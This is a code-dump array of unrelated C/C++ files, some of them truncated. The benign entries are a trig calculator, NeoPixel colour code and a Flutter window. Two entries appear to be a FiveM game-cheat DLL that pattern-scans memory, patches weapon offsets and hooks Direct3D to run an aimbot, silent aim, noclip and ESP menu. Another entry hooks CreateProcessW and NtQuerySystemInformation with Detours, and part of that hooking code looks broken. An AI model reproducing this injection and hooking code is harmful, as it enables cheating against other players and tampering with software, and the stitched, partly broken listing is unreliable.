    "\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include \"detours.h\"\r\n#include <Winternl.h>\r\n\r\n\r\nstruct defines {\r\n\r\n    typedef BOOL(WINAPI* LPFN_CREATEPROCESSW)(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n        );\r\n\r\n\ttypedef NTSTATUS(NTAPI* LPFN_NTQUERYSYSTEMINFORMATION)(\r\n\t\tSYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n\t\tPVOID SystemInformation,\r\n\t\tULONG SystemInformationLength,\r\n\t\tPULONG ReturnLength\r\n\t\t);\r\n\r\n}; extern defines* define;\r\n\r\nstruct pointers {\r\n\r\n    HMODULE ntdll_module = GetModuleHandleA(\"ntdll.dll\");\r\n    defines::LPFN_CREATEPROCESSW CreateProcessW_pointer = CreateProcessW;\r\n    defines::LPFN_NTQUERYSYSTEMINFORMATION NtQuerySystemInformation_pointer = (defines::LPFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll_module, \"NtQuerySystemInformation\");;\r\n\r\n}; pointers* ptr = new pointers();\r\n\r\nstruct detoured {\r\n\r\n   static BOOL WINAPI CreateProcessW_Hook(\r\n        LPCWSTR lpApplicationName,\r\n        LPWSTR lpCommandLine,\r\n        LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n        LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n        BOOL bInheritHandles,\r\n        DWORD dwCreationFlags,\r\n        LPVOID lpEnvironment,\r\n        LPCWSTR lpCurrentDirectory,\r\n        LPSTARTUPINFOW lpStartupInfo,\r\n        LPPROCESS_INFORMATION lpProcessInformation\r\n    )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n  static NTSTATUS NTAPI NtQuerySystemInformation_Hook(\r\n       SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n       PVOID SystemInformation,\r\n       ULONG SystemInformationLength,\r\n       PULONG ReturnLength\r\n   ) \r\n   {\r\n\r\n      return FALSE;\r\n   }\r\n}; extern detoured* detours;\r\n\r\nclass anti_process\r\n{\r\n\r\npublic:\r\n\r\n    void anti_file() {\r\n        HMODULE module = GetModuleHandleA(\"kernel32.dll\");\r\n        if (module) \r\n\t{\r\n\t    ptr->CreateProcessW_pointer = (defines::LPFN_CREATEPROCESSW)GetProcAddress(module, \"CreateProcessW\");\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->CreateProcessW_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n    void anti_NTQUERY() {\r\n\r\n        HMODULE module = GetModuleHandleA(\"ntdll.dll\");\r\n        if (module)\r\n        {\r\n            HHOOK hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)detours->NtQuerySystemInformation_Hook, module, 0);\r\n            printf(\"success\");\r\n            getchar();\r\n        }\r\n    }\r\n\r\n\tvoid hook_process() \r\n\t{\r\n\t   DetourTransactionBegin();\r\n\t   DetourUpdateThread(GetCurrentThread());\r\n\t   DetourAttach(&(PVOID&)ptr->CreateProcessW_pointer, detours->CreateProcessW_Hook);\r\n\t   DetourTransactionCommit();\r\n\t} \r\n}; static anti_process* process = new anti_process();\r\n\r\n\r\nint main()\r\n{\r\n    process->anti_NTQUERY(); // works best.\r\n}\r\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include <bits/stdc++.h>\r\n#include <cmath>\r\n#include <math.h>\r\n#define long long ll\r\nusing namespace std;\r\nstring input = \"\", tmp = \"\";\r\nvector<string> list_num;\r\nvector<char> num;\r\nfloat _tmp;\r\nbool is_number(string &s)\r\n{\r\n    float v;\r\n    try\r\n    {\r\n        v = stof(s);\r\n    }\r\n    catch (const exception &e)\r\n    {\r\n        return false;\r\n    }\r\n    return true;\r\n\r\n    // isdigit(s.c_str());\r\n\r\n    // int cnt=0;\r\n    // for (char c : s) {\r\n    //     if(c=='.') cnt++;\r\n    //     if ((!isdigit(c)&&c!='.')||cnt>1) {\r\n    //         return false;\r\n    //     }\r\n    // }\r\n    // return true;\r\n}\r\nfloat calc(string &func_type, string &param)\r\n{\r\n    float val;\r\n    // func = list_num[i].substr(0, 3);\r\n    // func_param = list_num[i].substr(4, list_num[i].length() - 5);\r\n    if (func_type == \"sin\")\r\n    {\r\n        val = sin(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"cos\")\r\n    {\r\n        val = cos(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"tan\")\r\n    {\r\n        val = tan(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"num\")\r\n    {\r\n        val = stof(param);\r\n    }\r\n    else\r\n    {\r\n        cerr << \"Error:Please use cos,tan or num.\";\r\n        return 0x7fffffff;\r\n    }\r\n\r\n    return val;\r\n}\r\n\r\nfloat count()\r\n{\r\n    string func, func_param;\r\n    if (is_number(list_num[0]))\r\n    {\r\n        func = \"num\";\r\n        func_param = list_num[0];\r\n    }\r\n    else\r\n    {\r\n        func = list_num[0].substr(0, 3);\r\n        func_param = list_num[0].substr(4, list_num[0].length() - 5);\r\n    }\r\n    float func_val = calc(func, func_param);\r\n    for (int i = 1; i < list_num.size(); i++)\r\n    {\r\n        if (is_number(list_num[i]))\r\n        {\r\n            func = \"num\";\r\n            func_param = list_num[i];\r\n        }\r\n        else\r\n        {\r\n            func = list_num[i].substr(0, 3);\r\n            func_param = list_num[i].substr(4, list_num[i].length() - 5);\r\n        }\r\n        float func_val_temp = calc(func, func_param);\r\n        switch (num[i - 1])\r\n        {\r\n        case '*':\r\n            func_val *= func_val_temp;\r\n            break;\r\n        case '+':\r\n            func_val += func_val_temp;\r\n            break;\r\n        case '-':\r\n            func_val -= func_val_temp;\r\n            break;\r\n        case '/':\r\n            func_val /= func_val_temp;\r\n            break;\r\n        }\r\n    }\r\n    return func_val;\r\n}\r\nvoid split(string &data)\r\n{   \r\n    for (int i = 0; i < data.size(); i++)\r\n    {\r\n        if (data[i] == '+' || data[i] == '-' || data[i] == '*' || data[i] == '/')\r\n        {\r\n            if(tmp==\"\"&&data[i]=='-'){\r\n                tmp+=data[i];\r\n                continue;\r\n            }\r\n            list_num.push_back(tmp);\r\n            num.push_back(data[i]);\r\n            tmp = \"\";\r\n        }\r\n        else if (i == data.size() - 1)\r\n        {\r\n            tmp += data[i];\r\n            list_num.push_back(tmp);\r\n            tmp = \"\";\r\n            break;\r\n        }\r\n        else\r\n        {\r\n            tmp += data[i];\r\n        }\r\n    }\r\n}\r\nint main()\r\n{\r\n    // OK: sin(90)+sin(90)+sin(90)-sin(90)\r\n    // NG: sin(90)+num(90) Not Acceptable\r\n    // OK: sin(90)+9999999\r\n    // OK: sin(90)+(sin(90)+0.5)\r\n\r\n    cin >> input;\r\n    split(input);\r\n    float ans = count();\r\n    if (ans != 0x7fffffff)\r\n    {\r\n        cout << \"The answer is:\" << ans;\r\n    }\r\n    else\r\n    {\r\n        return -1;\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include \"NeoSPI.h\"\n#include <iostream>\n#include <unistd.h>\n\nint pix = 100;\n\nNeoSPI strip;\n\n\nstatic const uint8_t _NeoPixelGammaTable[256] = {\n    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,\n    0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   1,   1,\n    1,   1,   1,   1,   1,   1,   2,   2,   2,   2,   2,   2,   2,   2,   3,\n    3,   3,   3,   3,   3,   4,   4,   4,   4,   5,   5,   5,   5,   5,   6,\n    6,   6,   6,   7,   7,   7,   8,   8,   8,   9,   9,   9,   10,  10,  10,\n    11,  11,  11,  12,  12,  13,  13,  13,  14,  14,  15,  15,  16,  16,  17,\n    17,  18,  18,  19,  19,  20,  20,  21,  21,  22,  22,  23,  24,  24,  25,\n    25,  26,  27,  27,  28,  29,  29,  30,  31,  31,  32,  33,  34,  34,  35,\n    36,  37,  38,  38,  39,  40,  41,  42,  42,  43,  44,  45,  46,  47,  48,\n    49,  50,  51,  52,  53,  54,  55,  56,  57,  58,  59,  60,  61,  62,  63,\n    64,  65,  66,  68,  69,  70,  71,  72,  73,  75,  76,  77,  78,  80,  81,\n    82,  84,  85,  86,  88,  89,  90,  92,  93,  94,  96,  97,  99,  100, 102,\n    103, 105, 106, 108, 109, 111, 112, 114, 115, 117, 119, 120, 122, 124, 125,\n    127, 129, 130, 132, 134, 136, 137, 139, 141, 143, 145, 146, 148, 150, 152,\n    154, 156, 158, 160, 162, 164, 166, 168, 170, 172, 174, 176, 178, 180, 182,\n    184, 186, 188, 191, 193, 195, 197, 199, 202, 204, 206, 209, 211, 213, 215,\n    218, 220, 223, 225, 227, 230, 232, 235, 237, 240, 242, 245, 247, 250, 252,\n    255};\n\n\nstatic uint8_t gamma8(uint8_t x) {\n    return _NeoPixelGammaTable[x]; // 0-255 in, 0-255 out\n  }\n\n\nvoid int2RGB(uint16_t n, uint32_t c)\n{\n  uint8_t *p, r = (uint8_t)(c >> 16), g = (uint8_t)(c >> 8), b = (uint8_t)c;\n  strip.setPixelRGB(r,g,b,n);\n}\n\nuint32_t ColorHSV(uint16_t hue, uint8_t sat = 255, uint8_t val = 255) {\n\n  uint8_t r, g, b;\n\n  // Remap 0-65535 to 0-1529. Pure red is CENTERED on the 64K rollover;\n  // 0 is not the start of pure red, but the midpoint...a few values above\n  // zero and a few below 65536 all yield pure red (similarly, 32768 is the\n  // midpoint, not start, of pure cyan). The 8-bit RGB hexcone (256 values\n  // each for red, green, blue) really only allows for 1530 distinct hues\n  // (not 1536, more on that below), but the full unsigned 16-bit type was\n  // chosen for hue so that one's code can easily handle a contiguous color\n  // wheel by allowing hue to roll over in either direction.\n  hue = (hue * 1530L + 32768) / 65536;\n  // Because red is centered on the rollover point (the +32768 above,\n  // essentially a fixed-point +0.5), the above actually yields 0 to 1530,\n  // where 0 and 1530 would yield the same thing. Rather than apply a\n  // costly modulo operator, 1530 is handled as a special case below.\n\n  // So you'd think that the color \"hexcone\" (the thing that ramps from\n  // pure red, to pure yellow, to pure green and so forth back to red,\n  // yielding six slices), and with each color component having 256\n  // possible values (0-255), might have 1536 possible items (6*256),\n  // but in reality there's 1530. This is because the last element in\n  // each 256-element slice is equal to the first element of the next\n  // slice, and keeping those in there this would create small\n  // discontinuities in the color wheel. So the last element of each\n  // slice is dropped...we regard only elements 0-254, with item 255\n  // being picked up as element 0 of the next slice. Like this:\n  // Red to not-quite-pure-yellow is:        255,   0, 0 to 255, 254,   0\n  // Pure yellow to not-quite-pure-green is: 255, 255, 0 to   1, 255,   0\n  // Pure green to not-quite-pure-cyan is:     0, 255, 0 to   0, 255, 254\n  // and so forth. Hence, 1530 distinct hues (0 to 1529), and hence why\n  // the constants below are not the multiples of 256 you might expect.\n\n  // Convert hue to R,G,B (nested ifs faster than divide+mod+switch):\n  if (hue < 510) { // Red to Green-1\n    b = 0;\n    if (hue < 255) { //   Red to Yellow-1\n      r = 255;\n      g = hue;       //     g = 0 to 254\n    } else {         //   Yellow to Green-1\n      r = 510 - hue; //     r = 255 to 1\n      g = 255;\n    }\n  } else if (hue < 1020) { // Green to Blue-1\n    r = 0;\n    if (hue < 765) { //   Green to Cyan-1\n      g = 255;\n      b = hue - 510;  //     b = 0 to 254\n    } else {          //   Cyan to Blue-1\n      g = 1020 - hue; //     g = 255 to 1\n      b = 255;\n    }\n  } else if (hue < 1530) { // Blue to Red-1\n    g = 0;\n    if (hue < 1275) { //   Blue to Magenta-1\n      r = hue - 1020; //     r = 0 to 254\n      b = 255;\n    } else { //   Magenta to Red-1\n      r = 255;\n      b = 1530 - hue; //     b = 255 to 1\n    }\n  } else { // Last 0.5 Red (quicker than % operator)\n    r = 255;\n    g = b = 0;\n  }\n\n  // Apply saturation and value to R,G,B, pack into 32-bit result:\n  uint32_t v1 = 1 + val;  // 1 to 256; allows >>8 instead of /255\n  uint16_t s1 = 1 + sat;  // 1 to 256; same reason\n  uint8_t s2 = 255 - sat; // 255 to 0\n  return ((((((r * s1) >> 8) + s2) * v1) & 0xff00) << 8) |\n         ",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if 